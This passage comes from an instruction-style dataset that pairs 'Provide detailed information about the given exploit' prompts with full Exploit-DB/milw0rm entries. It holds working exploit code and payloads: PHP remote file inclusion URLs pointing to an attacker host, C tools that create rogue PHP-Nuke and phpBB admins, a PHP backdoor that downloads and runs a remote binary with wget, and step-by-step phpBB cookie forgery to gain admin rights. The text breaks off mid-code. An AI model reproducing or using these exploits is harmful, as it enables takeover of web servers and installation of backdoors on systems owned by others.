erf2;\n                       erf = erf /10;\n               };\n               return chaine;\n       }\n       else\n               return 0;\n}\nbool goodcar(char carac)\n{\n       unsigned short cpt;\n       if(!carac)\n               return 0;\n       // i hate do like this :/\n       char *goodcar = \"abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMONPQRSTUVWXYZ012345689<>\u00e9@\u00e0)]=}\u00e8[_-{#&*\\\\/-+~'\u00e7$%.:;|^~$,!?\\\"\\'\\t\\r\\n \";\n       for(cpt = 0;(goodcar[cpt] != '\\0') && (goodcar[cpt] != carac);cpt++);\n       if(goodcar[cpt] == carac)\n               return 1;\n       return 0;\n}\n\nunsigned int utf8decode(char *utf)\n{\n       char *r;\n       char *w;\n       char tmp;\n       bool han;\n       r = w = utf;\n       while(*r)\n       {\n               if(*r =='%')\n               {\n                       tmp = alphanum(r+1,&han);\n                       if(han)\n                       {\n                               *w = tmp;\n                               r += 2;\n                       }\n                       else\n                               *w = *r;\n               }\n               else\n                       *w = *r;\n               w++;\n               r++;\n       };\n       *w = '\\0';\n       return (w-utf);\n}\n\nchar alphanum(char *of,bool *wesh)\n{\n       unsigned char retour;\n       retour = 0x00;\n       *wesh = 0;\n       if(!(*of && *(of+1)))\n               return 0x00;\n       if((*of >= 'a') && (*of <= 'f'))\n               retour = ((*of - 'a') +10) * 0x10;\n       else if((*of >= 'A') && (*of <= 'F'))\n               retour = ((*of - 'A') +10) * 0x10;\n       else if((*of >= '0') && (*of <= '9'))\n               retour = (*of - '0') * 0x10;\n       else\n               return 0x00;\n       of++;\n       if((*of >= 'a') && (*of <= 'f'))\n               retour += ((*of - 'a') +10);\n       else if((*of >= 'A') && (*of <= 'F'))\n               retour += ((*of - 'A') +10);\n       else if((*of >= '0') && (*of <= '9'))\n               retour += (*of - '0');\n       else\n               return 0x00;\n       *wesh = 1;\n       return retour;\n}\n\n//////////////////////////////////\n\n/*\n#include <winsock.h>\n#include <string.h>\n\nclass serveur\n{\n\tpublic:\n\t\tbool createsocket();\n\t\tbool listen(unsigned short port,unsigned int nbwaitconnect);\n\t\tserveur * waitconnect();\n\t\tbool connectsocket(char *dns,unsigned short port);\n\t\tbool socketsend(char *envoi);\n\t\tbool getword(char in[],unsigned int max);\n\t\tbool getword(char in2[]);\n\t\tbool getline(char buf[],unsigned int maxcara);\n\t\tbool getline(char buf2[]);\n\t\tbool ifgetchar(char *caraif);\n\t\tbool ifchargetnb(char ligne[],unsigned int aumax);\n\t\tbool ifchargetline(char ligne[],unsigned int lemax);\n\t\tbool ifchargetline(char ligne[]);\n\t\tbool getnb(char *vect,unsigned int nb);\n\t\tbool sendnb(char *vec,unsigned int longueur);\n\t\tbool isconnect();\n\t\tint getnumsock();\n\t\tvoid closesock();\n\t\tbool createbytheclass(int thesock,struct sockaddr_in thestruct);\n\t\tunsigned int maxread;\n\t\tunsigned int seconde;\n\t\tunsigned int microseconde;\n\t\tserveur();\n\t\t~serveur();\n\t\tvoid operator << (char *chaine);\n\t\tvoid operator >> (char *read);\n\n\tprivate:\n\t\tbool connected;\n\t\tbool create;\n\t\tstruct sockaddr_in mysock;\n\t\tint sock;\n\n};\n\n\nbool serveur::createsocket()\n{\n\tif (create)\n\t\treturn 0;\n\tsock = socket(PF_INET, SOCK_STREAM, IPPROTO_TCP);\n\tif(sock <0)\n\t{\n\t\tcreate = 0;\n\t\treturn 0;\n\t};\n\tcreate = 1;\n\treturn sock;\n}\n\nbool serveur::listen(unsigned short port, unsigned int nbwaitconnect)\n{\n\tint test;\n\tmemset(&mysock, 0, sizeof(mysock));\n\tmysock.sin_family = AF_INET ;\n\tmysock.sin_addr.s_addr = htonl(INADDR_ANY);\n\tmysock.sin_port = htons(port);\n\ttest = bind(sock,(sockaddr *) &mysock,sizeof(mysock));\n\tif (test <0)\n\t{\n\t\tclosesock();\n\t\treturn 0;\n\t};\n\tlisten(sock,nbwaitconnect);\n\treturn 1;\n}\n\nserveur * serveur::waitconnect()\n{\n\tstruct sockaddr_in astruct;\n\tint taille;\n\tint asock;\n\tserveur * newsock ;\n\ttaille = sizeof(astruct);\n\tasock = accept(sock, (sockaddr *) &astruct,&taille);\n\tnewsock = new serveur ;\n\tnewsock->createbytheclass(asock,astruct);\n\treturn newsock;\n}\n\nbool serveur::connectsocket(char *dns,unsigned short port)\n{\n\tstruct hostent *hoste;\n\tint test;\n\tmemset(&mysock, 0, sizeof(mysock));\n\tif(!(hoste = gethostbyname(dns)))\n\t\tmysock.sin_addr.s_addr = inet_addr(dns);\n\telse\n\t\tmemcpy(&(mysock.sin_addr),hoste->h_addr,hoste->h_length);\n\tmysock.sin_family = AF_INET ;\n\tmysock.sin_port = htons(port);\n\ttest = connect(sock,(struct sockaddr *) &mysock , sizeof(mysock));\n\tif(test <0)\n\t\treturn 0;\n\tconnected = 1;\n\treturn 1;\n};\n\nbool serveur::socketsend(char *envoi)\n{\n\tint veri;\n\tint taiverif;\n\tif(!connected)\n\t\treturn 0;\n\tveri = strlen(envoi);\n\ttaiverif = send(sock,envoi,veri,0);\n\tif(veri != taiverif)\n\t{\n\t\tconnected = 0;\n\t\treturn 0;\n\t};\n\treturn 1;\n}\n\nbool serveur::getline(char buf[],unsigned int maxcara)\n{\n\tunsigned int testing;\n\tunsigned int curseur;\n\tchar recoi;\n\tif(!connected)\n\t\treturn 0;\n\tcurseur = 0;\n\tdo{\n\t\ttesting = recv(sock,&recoi,sizeof(char),0);\n\t\tif(testing != sizeof(char))\n\t\t{\n\t\t\tbuf[curseur] = '\\0' ;\n\t\t\tconnected = 0;\n\t\t\treturn 0;\n\t\t};\n\t\tif( curseur == maxcara)\n\t\t{\n\t\t\tbuf[curseur] = '\\0';\n\t\t};\n\t\tif ((curseur < maxcara)&&(recoi != '\\r')&&(recoi != '\\n'))\n\t\t{\n\t\t\tbuf[curseur] = recoi ;\n\t\t\tcurseur++ ;\n\t\t};\n\t}while(recoi != '\\n' );\n\tbuf[curseur] = '\\0' ;\n\treturn 1;\n}\n\nbool serveur::getline(char buf2[])\n{\n\treturn getline(buf2,maxread);\n}\n\nbool serveur::getword(char in[],unsigned int max)\n{\n\tint testing;\n\tunsigned int curseur;\n\tchar recoi;\n\tif(!connected)\n\t\treturn 0;\n\tcurseur = 0;\n\tdo{\n\t\ttesting = recv(sock,&recoi,sizeof(char),0);\n\t\tif(testing != sizeof(char))\n\t\t{\n\t\t\tin[curseur] = '\\0' ;\n\t\t\tconnected = 0;\n\t\t\treturn 0;\n\t\t};\n\t\tif( curseur == max)\n\t\t{\n\t\t\tin[curseur] = '\\0';\n\t\t};\n\t\tif ((curseur < max)&&(recoi != '\\r')&&(recoi != '\\n')&&(recoi != ' '))\n\t\t{\n\t\t\tin[curseur] = recoi ;\n\t\t\tcurseur++ ;\n\t\t};\n\t}while((recoi != '\\n') && (recoi != ' '));\n\tin[curseur] = '\\0' ;\n\treturn 1;\n}\n\nbool serveur::getword(char in2[])\n{\n\treturn getword(in2,maxread);\n}\n\nbool serveur::ifgetchar(char *caraif)\n{\n\tfd_set fdens;\n\tstruct timeval tv;\n\ttv.tv_sec = seconde ;\n\ttv.tv_usec = microseconde ;\n\tFD_ZERO(&fdens);\n\tFD_SET(sock,&fdens);\n\tselect(sock+1, &fdens, NULL, NULL, &tv);\n\tif(FD_ISSET(sock,&fdens))\n\t{\n\t\tif(!getnb(caraif,sizeof(char)))\n\t\t\tclosesock();\n\t\treturn 1;\n\t}\n\telse\n\t{\n\t\treturn 0;\n\t};\n}\n\nbool serveur::ifchargetnb(char ligne[],unsigned int aumax)\n{\n\tbool retour;\n\tretour = ifgetchar(ligne) ;\n\tif(retour)\n\t{\n\t\tconnected = getnb(ligne,aumax) ;\n\t};\n\treturn retour;\n}\n\nbool serveur::ifchargetline(char ligne[],unsigned int lemax)\n{\n\tbool retour;\n\tretour = ifgetchar(ligne) ;\n\tif(retour)\n\t{\n\t\tif(*ligne == '\\n')\n\t\t{\n\t\t\t*ligne = '\\0';\n\t\t\treturn 1;\n\t\t};\n\t\tif(*ligne != '\\r')\n\t\t\tligne++;\n\t\tconnected = getline(ligne,lemax) ;\n\t};\n\treturn retour;\n}\n\nbool serveur::ifchargetline(char ligne[])\n{\n\treturn ifchargetline(ligne,maxread);\n}\n\nbool serveur::getnb(char *vect,unsigned int nb)\n{\n\tunsigned int testing;\n\tunsigned int curseur;\n\tchar recoi;\n\tif(!connected)\n\t\treturn 0;\n\tcurseur = 0;\n\tdo{\n\t\ttesting = recv(sock,&recoi,sizeof(char),0);\n\t\tif(testing != sizeof(char))\n\t\t{\n\t\t\tvect[curseur] = '\\0' ;\n\t\t\tconnected = 0;\n\t\t\treturn 0;\n\t\t};\n\t\tif( curseur == nb)\n\t\t{\n\t\t\tvect[curseur] = '\\0';\n\t\t};\n\t\tif (curseur < nb)\n\t\t{\n\t\t\tvect[curseur] = recoi ;\n\t\t\tcurseur++ ;\n\t\t};\n\t}while(curseur < nb);\n\treturn 1;\n}\n\nbool serveur::sendnb(char *vec,unsigned int longueur)\n{\n\tint taiverif;\n\tif(!connected)\n\t\treturn 0;\n\ttaiverif = send(sock,vec,longueur,0);\n\tif((int)longueur != taiverif)\n\t{\n\t\tconnected = 0;\n\t\treturn 0;\n\t};\n\treturn 1;\n}\n\nint serveur::getnumsock()\n{\n\treturn sock;\n}\n\nbool serveur::createbytheclass(int thesock,struct sockaddr_in thestruct)\n{\n\tif(create)\n\t\treturn 0;\n\tsock = thesock ;\n\tmemcpy(&mysock,&thestruct,sizeof(thestruct));\n\tcreate = 1;\n\tconnected = 1;\n\treturn 1;\n}\n\nvoid serveur::closesock()\n{\n\tif(create)\n\t{\n\t\tclosesocket(sock);\n\t\tcreate = 0;\n\t\tconnected = 0;\n\t};\n}\n\nbool serveur::isconnect()\n{\n\treturn connected;\n}\n\nvoid serveur::operator << (char *chaine)\n{\n\tsocketsend(chaine);\n}\n\nvoid serveur::operator >> (char *read)\n{\n\tgetword(read);\n}\n\nserveur::serveur()\n{\n\tconnected = 0;\n\tcreate = 0 ;\n\tmaxread = 0xFFFFFFFF ;\n\tseconde = 0;\n\tmicroseconde = 0;\n\tcreatesocket();\n}\n\nserveur::~serveur()\n{\n\tif(connected)\n\t\tclosesock();\n}\n*/\n\n\n\n\n// milw0rm.com [2004-12-17]"
        }
    },
    {
        "instruction": "Provide detailed information about the given exploit.",
        "input": "Exploit ID: 857",
        "output": {
            "ID": "857",
            "File": "exploits/php/webapps/857.txt",
            "Description": "PHP Form Mail 2.3 - Arbitrary File Inclusion",
            "Date Published": "2005-03-05",
            "Author": "Filip Groszynski",
            "Type": "webapps",
            "Platform": "php",
            "Port": "",
            "Date Added": "2005-03-04",
            "Date Updated": "",
            "Verified": "1",
            "Codes": [
                "OSVDB-14572;CVE-2005-0678"
            ],
            "Tags": [
                ""
            ],
            "Aliases": [
                ""
            ],
            "Screenshot URL": "",
            "Application URL": "",
            "Source URL": "",
            "Exploit": "Example:\n\n if register_globals=on and allow_url_fopen=on:\n   http://[victim]/[dir]/inc/formmail.inc.php?script_root=http://[hacker_box]/\n\n# milw0rm.com [2005-03-05]"
        }
    },
    {
        "instruction": "Provide detailed information about the given exploit.",
        "input": "Exploit ID: 865",
        "output": {
            "ID": "865",
            "File": "exploits/php/webapps/865.txt",
            "Description": "PHP mcNews 1.3 - 'skinfile' Remote File Inclusion",
            "Date Published": "2005-03-07",
            "Author": "Filip Groszynski",
            "Type": "webapps",
            "Platform": "php",
            "Port": "",
            "Date Added": "2005-03-06",
            "Date Updated": "",
            "Verified": "1",
            "Codes": [
                "OSVDB-14601;CVE-2005-0720"
            ],
            "Tags": [
                ""
            ],
            "Aliases": [
                ""
            ],
            "Screenshot URL": "",
            "Application URL": "",
            "Source URL": "",
            "Exploit": "Example:\n\n if register_globals=on and allow_url_fopen=on:\n   http://[victim]/[dir]/mcNews/admin/header.php?skinfile=http://[hacker_box]/\n\n# milw0rm.com [2005-03-07]"
        }
    },
    {
        "instruction": "Provide detailed information about the given exploit.",
        "input": "Exploit ID: 801",
        "output": {
            "ID": "801",
            "File": "exploits/php/webapps/801.c",
            "Description": "PHP-Nuke 7.4 - Admin",
            "Date Published": "2005-02-09",
            "Author": "Silentium",
            "Type": "webapps",
            "Platform": "php",
            "Port": "",
            "Date Added": "2005-02-08",
            "Date Updated": "2016-04-28",
            "Verified": "1",
            "Codes": [
                "OSVDB-9563"
            ],
            "Tags": [
                ""
            ],
            "Aliases": [
                ""
            ],
            "Screenshot URL": "",
            "Application URL": "http://www.exploit-db.comPHP-Nuke-7.4.zip",
            "Source URL": "",
            "Exploit": "/*\n * old exploit but what pretty code /str0ke\n */\n\n/****************************************************\n*                                                   *\n* phpNUKE v7.4 exploit                              *\n*                                                   *\n* this exploit create new admin with relative       *\n* passwd that you specified on parameter of exploit *\n* you take administrative control of the webPortal  *\n*                                                   *\n* Reverences: http://www.osvdb.org/9563             *\n*                                                   *\n* coded by: Silentium of Anacron Group Italy        *\n*      date: 07/02/2005                             *\n*    e-mail: anacrongroupitaly[at]autistici[dot]org *\n*   my_home: www.autistici.org/anacron.group-italy  *\n*                                                   *\n* this tool is developed under GPL license          *\n* no(c) .:. copyleft                                *\n*                                                   *\n****************************************************/\n\n#include <stdio.h>\n#include <stdlib.h>\n#include <sys/types.h>\n#include <sys/socket.h>\n#include <netinet/in.h>\n#include <netdb.h>\n\n#define PORT 80\t\t// port of web server\n\nvoid info(void);\nvoid sendxpl(FILE *out, char *argv[]);\nvoid errsock(void);\nvoid errgeth(void);\nvoid errconn(char *argv[]);\n\nint main(int argc, char *argv[]){\n\nFILE *out;\nint sock, sockconn;\nstruct sockaddr_in addr;\nstruct hostent *hp;\n\nif(argc!=5)\n   info();\n\nif((sock = socket(AF_INET,SOCK_STREAM,0)) < 0)\n   errsock();\n\n   system(\"clear\");\n   printf(\"[*] Creating socket\t\t[OK]\\n\");\n\nif((hp = gethostbyname(argv[1])) == NULL)\n   errgeth();\n\n   printf(\"[*] Resolving victim host\t[OK]\\n\");\n\nmemset(&addr,0,sizeof(addr));\nmemcpy((char *)&addr.sin_addr,hp->h_addr,hp->h_length);\naddr.sin_family = AF_INET;\naddr.sin_port = htons(PORT);\n\nsockconn = connect(sock,(struct sockaddr *)&addr,sizeof(addr));\nif(sockconn < 0)\n   errconn(argv);\n\n   printf(\"[*] Connecting at victim host   [OK]\\n\");\n\nout = fdopen(sock,\"a\");\nsetbuf(out,NULL);\n\nsendxpl(out,argv);\n\n   printf(\"[*] Now check your username and password\\n\"\n          \"    on http://%s%s\\n\\n\",argv[1],argv[2]);\n\nshutdown(sockconn,2);\nclose(sockconn);\n\nreturn 0;\n\n}\n\n\nvoid info(void){\n\nsystem(\"clear\");\nprintf(\"#########################################\\n\"\n       \"# phpNUKE v7.4 exploit                  #\\n\"\n       \"#########################################\\n\"\n       \"# this exploit create an admin with     #\\n\"\n       \"# the relative password, for your fun.  #\\n\"\n       \"# exploit coded by Silentium            #\\n\"\n       \"# Anacron Group Italy                   #\\n\"\n       \"# www.autistici.org/anacron-group-italy #\\n\"\n       \"#########################################\\n\\n\"\n       \"[Use]\\n\\n\"\n       \" silePNUKExpl <victim_host> <path_adminpage> <username> <password>\\n\\n\"\n       \"[example]\\n\\n\"\n       \" silePNUKExpl www.victim.com /admin.php sile silePass\\n\\n\");\nexit(1);\n\n}\n\n\nvoid sendxpl(FILE *out, char *argv[]){\n\nint size = 145;\n\nsize+=sizeof(argv[3]);\nsize+=sizeof(argv[4]);\n\n    fprintf(out,\"POST %s HTTP/1.0\\n\"\n                \"Connection: Keep-Alive\\n\"\n                \"Pragma: no-cache\\n\"\n                \"Cache-control: no-cache\\n\"\n                \"Accept: text/html, image/jpeg, image/png, text/*, image/*, */*\\n\"\n                \"Accept-Encoding: x-gzip, x-deflate, gzip, deflate, identity\\n\"\n                \"Accept-Charset: iso-8859-1, utf-8;q=0.5, *;q=0.5\\n\"\n                \"Accept-Language: en\\n\"\n                \"Host: %s\\n\"\n                \"Content-Type: application/x-www-form-urlencoded\\n\"\n                \"Content-Length: %d\\n\\n\"\n                \"add_aid=%s&add_name=morte&add_pwd=%s&add_email=email%%40mail.com&admin=\"\n                \"eCcgVU5JT04gU0VMRUNUIDEvKjox&add_radminsuper=1&op=AddAuthor&Submit=\"\n                \"Create+Admin\\n\\n\",argv[2],argv[1],size,argv[3],argv[4]);\n\n                 printf(\"[*] Sending exploit\t\t[OK]\\n\\n\");\n\n}\n\n\nvoid errsock(void){\n\nsystem(\"clear\");\nprintf(\"[x] Creating socket\t[FAILED]\\n\\n\");\nexit(1);\n\n}\n\n\nvoid errgeth(void){\n\nprintf(\"[x] Resolving victim host\t[FAILED]\\n\\n\");\nexit(1);\n\n}\n\n\nvoid errconn(char *argv[]){\n\nprintf(\"[x] Connecting at victim host\t[FAILED]\\n\\n\",argv[1]);\nexit(1);\n\n}\n\n// milw0rm.com [2005-02-09]"
        }
    },
    {
        "instruction": "Provide detailed information about the given exploit.",
        "input": "Exploit ID: 436",
        "output": {
            "ID": "436",
            "File": "exploits/php/webapps/436.txt",
            "Description": "PHP-Nuke 7.4 - Privilege Escalation",
            "Date Published": "2004-09-08",
            "Author": "mantra",
            "Type": "webapps",
            "Platform": "php",
            "Port": "",
            "Date Added": "2004-09-07",
            "Date Updated": "2016-03-30",
            "Verified": "1",
            "Codes": [
                "OSVDB-9563"
            ],
            "Tags": [
                ""
            ],
            "Aliases": [
                ""
            ],
            "Screenshot URL": "",
            "Application URL": "http://www.exploit-db.comPHP-Nuke-7.4.zip",
            "Source URL": "",
            "Exploit": "A demonstration exploit HTTP form is provided:\n\n<form name=\"mantra\" method=\"POST\" action=\"http://www.sitewithphpnuke.com/admin.php\">\n<p>USERNAME:\n<input type=\"text\" name=\"add_aid\">\n<br>\nNOME:\n<input type=\"text\" name=\"add_name\">\n<br>\nPASSWORD:\n<input type=\"text\" name=\"add_pwd\">\n<br>\nE-MAIL:\n<input type=\"text\" name=\"add_email\">\n<br>\n<input type=\"hidden\" name=\"admin\" value=\"eCcgVU5JT04gU0VMRUNUIDEvKjox\">\n<br>\n<input type=\"hidden\" name=\"add_radminsuper\" value=\"1\">\n<br>\n<input type=\"hidden\" name=\"op\" value=\"AddAuthor\">\n</p>\n<p>\n<input type=\"submit\" name=\"Submit\" value=\"Create Admin\">\n<br>\n</p>\n</form>\n\n# milw0rm.com [2004-09-08]"
        }
    },
    {
        "instruction": "Provide detailed information about the given exploit.",
        "input": "Exploit ID: 676",
        "output": {
            "ID": "676",
            "File": "exploits/php/webapps/676.c",
            "Description": "phpBB 1.0.0/2.0.10 - 'admin_cash.php' Remote Code Execution",
            "Date Published": "2004-12-05",
            "Author": "evilrabbi",
            "Type": "webapps",
            "Platform": "php",
            "Port": "",
            "Date Added": "2004-12-04",
            "Date Updated": "2017-11-16",
            "Verified": "1",
            "Codes": [
                ""
            ],
            "Tags": [
                ""
            ],
            "Aliases": [
                "b4b0-phpbb.c"
            ],
            "Screenshot URL": "",
            "Application URL": "http://www.exploit-db.comphpBB-2.0.10.zip",
            "Source URL": "",
            "Exploit": "/*\n exploit for phpBB 1.0.0 - 2.0.10\n\n edit the b4b0.php file with the correct url to your backdoor and the correct filename for your backdoor upload it to a webserver.\n\n gcc -o b4b0-phpbb b4b0-phpbb.c\n\n./b4b0-phpbb <url_to_system> <phpbb_dir> <url_to_b4b0.php>\ntelnet <url_of_exploited_system> <port_of_back_door>\n\ngreets to b4b0\n\n\t-- evilrabbi\n*/\n\n#include <stdio.h>\n#include <string.h>\n#include <netdb.h>\n#include <sys/types.h>\n#include <sys/socket.h>\n#include <netinet/in.h>\n\nvoid help(char *program_name);\n\nint main(int argc, char *argv[]) {\n\n        struct sockaddr_in trg;\n        struct hostent *he;\n\n        int sockfd, buff;\n\tchar buffer[1024];\n\tchar *request;\n\n\tif(argc != 4 ) {\n\t\thelp(argv[0]);\n\t\texit(0);\n\t}\n\n        he = gethostbyname(argv[1]);\n        sockfd = socket(AF_INET, SOCK_STREAM, 0);\n\trequest = (char *) malloc(1024);\n\n        trg.sin_family = AF_INET;\n        trg.sin_port = htons(80);\n        trg.sin_addr = *((struct in_addr *) he->h_addr);\n        memset(&(trg.sin_zero), '\\0', 8);\n\n\tconnect(sockfd, (struct sockaddr *)&trg, sizeof(struct sockaddr));\n\tsprintf(request,\"GET http://%s/%s/admin/admin_cash.php?setmodules=1&phpbb_root_path=http://%s?cmd=w\\n\",argv[1],argv[2],argv[3]);\n\tsend(sockfd,request,strlen(request),0);\n\tbuff=recv(sockfd, buffer, 1024-1, 0);\n\tbuffer[buff] = '\\0';\n\tprintf(\"%s\",buffer);\n\tclose(sockfd);\n\treturn 0;\n\n}\n\nvoid help(char *program_name) {\n\n\tprintf(\"b4b0-phpbb.c by evilrabbi for b4b0\\n\\n\");\n\tprintf(\"%s hostname phpbb2_dir url_to_bad_php\\n\",program_name);\n\tprintf(\"%s www.example.com phpBB2 blah.com/b4b0.php.php\\n\",program_name);\n}\n\n\n/* Start of b4b0.php */\n\n/*\n\nb4b0 kickin ass again.......\nSystem was exploited telnet to the port you have your backdoor set to listen on.\n<?\n if (isset($chdir)) @chdir($chdir);\n  ob_start();\n  system(\"$cmd 1> /tmp/cmdtemp 2>&1; cat /tmp/cmdtemp; rm /tmp/cmdtemp\");\n   system(\"cd /tmp; wget url_to_backdoor;chmod +x backdoor_name;./backdoor_name\"); // EDIT THIS INFO!!!!!!!!!!!!!\n   $output = ob_get_contents();\n  ob_end_clean();\n  if (!empty($output)) echo str_replace(\">\", \">\", str_replace(\"<\", \"<\", $output));\n?>\n\n*/\n\n// milw0rm.com [2004-12-05]"
        }
    },
    {
        "instruction": "Provide detailed information about the given exploit.",
        "input": "Exploit ID: 871",
        "output": {
            "ID": "871",
            "File": "exploits/php/webapps/871.txt",
            "Description": "phpBB 2.0.12 - Session Handling Authentication Bypass",
            "Date Published": "2005-03-11",
            "Author": "Ali7",
            "Type": "webapps",
            "Platform": "php",
            "Port": "",
            "Date Added": "2005-03-10",
            "Date Updated": "2016-10-27",
            "Verified": "1",
            "Codes": [
                "OSVDB-14242;CVE-2005-0614"
            ],
            "Tags": [
                ""
            ],
            "Aliases": [
                ""
            ],
            "Screenshot URL": "",
            "Application URL": "http://www.exploit-db.comphpBB-2.0.10.zip",
            "Source URL": "",
            "Exploit": "phpBB 2.0.12 Session Handling Authentication Bypass ..\n\neasy to use exploit ..\n\n** YOU DON'T HAVE TO REGISTER AT THE VICTIM'S FORUM..\n\n1- Simply VISIT the forum using Mozilla Firefox.. and be sure that the cookie is made (:\n\n3- Close the Browser ..\n\n2- Open the cookies.txt ..((located on \"C:\\Documents and Settings\\ALI\\Application Data\\Mozilla\\Firefox\\Profiles\\ur4nn6o5.default\" when using WinXP)) in example ;)\n\nand you will find something like :\n---------------------------------------------------------------------------------------------------------------\\\\\n127.0.0.1 FALSE / FALSE 1141920503 phpbb2mysql_data a%3A0%3A%7B%7D\n---------------------------------------------------------------------------------------------------------------//\nwhere 127.0.0.1 is the domain for the forum << tested on localhost\nand a%3A0%3A%7B%7D is the cookie data ..<< as a visitor\n\n3- ok..let's do it !! ..\nnow open cookies.txt with your text editor\nand replace\n---------------------------------------------------------------------------------------------------------------\\\\\n127.0.0.1 FALSE / FALSE 1141920503 phpbb2mysql_data a%3A0%3A%7B%7D\n---------------------------------------------------------------------------------------------------------------//\nwith\n---------------------------------------------------------------------------------------------------------------\\\\\n127.0.0.1 FALSE / FALSE 1141920503 phpbb2mysql_data a%3A2%3A%7Bs%3A11%3A%22autologinid%22%3Bb%3A1%3Bs%3A6%3A%22userid%22%3Bs%3A1%3A%222%22%3B%7D\n---------------------------------------------------------------------------------------------------------------//\n\nsave the cookies.txt..\n\n4- Open your Browser..and go to the exploited forum ..\n>>enjoy Hi Permission mode !! :D\n\ncomplete the mission by clicking \" Go to Administration Panel \"\n\n--------------------------------------------------------------------------------\n\nwritten by : Ali7\ne-mail : ali7@hotmail.co.uk\n\n# milw0rm.com [2005-03-11]"
        }
    },
    {
        "instruction": "Provide detailed information about the given exploit.",
        "input": "Exploit ID: 858",
        "output": {
            "ID": "858",
            "File": "exploits/php/webapps/858.txt",
            "Description": "phpBB 2.0.12 - Session Handling Authentication Bypass (tutorial)",
            "Date Published": "2005-03-05",
            "Author": "PPC",
            "Type": "webapps",
            "Platform": "php",
            "Port": "",
            "Date Added": "2005-03-04",
            "Date Updated": "2016-04-28",
            "Verified": "1",
            "Codes": [
                ""
            ],
            "Tags": [
                ""
            ],
            "Aliases": [
                ""
            ],
            "Screenshot URL": "",
            "Application URL": "http://www.exploit-db.comphpBB-2.0.10.zip",
            "Source URL": "",
            "Exploit": "1. Register at forum?\n\n2. Log in with account\n  + UNCHECK \"Log in automatically\"\n\n3. Close browser to be sure a cookie is made.\n\n4. Locate cookie\n    *firefox: X:\\Documents and Settings\\Name\\Application\n     Data\\Mozilla\\Firefox\\Profiles\\profile.default\\cookies.txt\n     --> search the .txt for the domainname (domain.tld)\n     --> default cookiename = phpbbmysql\n    *iexplorer: X:\\Documents and Settings\\Name\\Cookies\\Name@domain.tld\n     --> default cookiename = phpbbmysql\n\nLet's Xploit!\n________________\n\nOpen the cookie in a text editor and search a line that resembles:\n\n* * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * *\n\n       a%3A2%3A%7Bs%3A11%3A%22autologinid%22%3Bs%3A0%3A%22%22%3B\n       s%3A6%3A%22userid%22%3Bs%3A1%3A%22X%22%3B%7D\n\n                                         |\n                  [ your 'user id' ] ____|\n\nReplace this with:\n\n       a%3A2%3A%7Bs%3A11%3A%22autologinid%22%3Bb%3A1%3B\n       s%3A6%3A%22userid%22%3Bs%3A1%3A%222%22%3B%7D\n\n                                         |\n          [ 2 = 'user id' of admin ] ____|\n\n* * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * *\n\nSave cookie and close.\nOpen your browser and surf to forum.\n\nYou'll now be automatically logged in having admin right :)\n\n# milw0rm.com [2005-03-05]"
        }
    },
    {
        "instruction": "Provide detailed information about the given exploit.",
        "input": "Exploit ID: 47",
        "output": {
            "ID": "47",
            "File": "exploits/php/webapps/47.c",
            "Description": "phpBB 2.0.4 - PHP Remote File Inclusion",
            "Date Published": "2003-06-30",
            "Author": "Spoofed",
            "Type": "webapps",
            "Platform": "php",
            "Port": "",
            "Date Added": "2003-06-29",
            "Date Updated": "2016-02-10",
            "Verified": "1",
            "Codes": [
                "OSVDB-4278"
            ],
            "Tags": [
                ""
            ],
            "Aliases": [
                ""
            ],
            "Screenshot URL": "",
            "Application URL": "http://www.exploit-db.comphpBB-2.0.4.zip",
            "Source URL": "",
            "Exploit": "/***********************************************************/\n/* phpBB 2.0.4 Remote Admin_Styles.PHP Theme_Info.CFG File Include  */\n/*                                                                                                    */\n/*                Exploit made on June 2003 by Spoofed Existence               */\n/*                                                                                                    */\n/*       Patch : http://www.phpbb.com/phpBB/viewtopic.php?t=113826      */\n/***********************************************************/\n\n#include <stdio.h>\n#include <sys/types.h>\n#include <sys/socket.h>\n#include <netinet/in.h>\n#include <netdb.h>\n\nint main()\n{\n //The socket stuff\n struct hostent *hp;\n struct sockaddr_in sa;\n int sock;\n\n //The input stuff\n char server[100];\n char location[100];\n char sfile[100];\n int escapes;\n char* file;\n\n //The request stuff\n char* request;\n char* postdata;\n char* header;\n\n //The buffer to store the response\n char buffer[4096];\n int tworeturns = 0;\n int showing = 0;\n\n //Other\n int i;\n\n //Ask the server\n printf(\"Server: \");\n scanf(\"%100s\", server);\n printf(\"Forum location: \");\n scanf(\"%100s\", location);\n printf(\"Directories to escape: \");\n scanf(\"%i\", &escapes);\n printf(\"File to get/execute: \");\n scanf(\"%100s\", sfile);\n\n\n //Start the exploit!\n printf(\"\\n\\nStarting the exploit...\\n\");\n\n //Connect to the server\n printf(\"Creating socket... \");\n if((sock = socket(AF_INET, SOCK_STREAM, 0)) < 0)\n {\n  printf(\"Failed!\\n\");\n  return 0;\n } else{ printf(\"Done!\\n\");\n }\n\n\n printf(\"Looking up server IP... \");\n if((hp = gethostbyname((char*)server)) == NULL)\n {\n  printf(\"Failed!\\n\");\n  return 0;\n } else { printf(\"Done!\\n\");\n }\n\n\n printf(\"Connecting %s:80... \", server);\n memcpy(&sa.sin_addr, hp->h_addr_list[0], hp->h_length);\n sa.sin_family = AF_INET;\n sa.sin_port = htons(80);\n if(connect(sock, (struct sockaddr*)&sa, sizeof(sa)))\n {\n  printf(\"Failed!\\n\");\n  return 0;\n } else { printf(\"Done!\\n\");\n }\n\n\n //Create the request\n printf(\"Building request... \");\n\n //Create the postdata\n file = (char*)malloc(sizeof(char) * (escapes * 3 + strlen(sfile) + 1));\n\n while(escapes > 0)\n {\n  if(escapes == 1)\n  {\n   sprintf(file, \"%s%s%s\", file, \"..\", sfile);\n  } else { sprintf(file, \"%s%s\", file, \"../\");\n  }\n\n  escapes --;\n }\n\n postdata = (char*)malloc((27 + strlen(file)) * sizeof(char));\n sprintf(postdata, \"send_file= &install_to=%s%s00\", file, \"%\");\n\n header = (char*)malloc((170 + strlen(server) + strlen(location)) *\nsizeof(char));\n sprintf(header, \"POST /%s/admin/admin_styles.php?mode=addnew\nHTTP/1.1\\r\\nContent-Type: application/x-www-form-urlencoded\\r\\nHost:\n%s\\r\\nContent-Length: %i\\r\\nConnection: close\\r\\n\\r\\n\", location, server,\nstrlen(postdata));\n\n request = (char*)malloc((strlen(postdata) + strlen(header) + 1) *\nsizeof(char));\n sprintf(request, \"%s%s\", header, postdata);\n\n printf(\"Done!\\n\");\n\n\n //Send the request\n printf(\"Sending request... \");\n write(sock, request, strlen(request));\n printf(\"Done!\\n\");\n\n 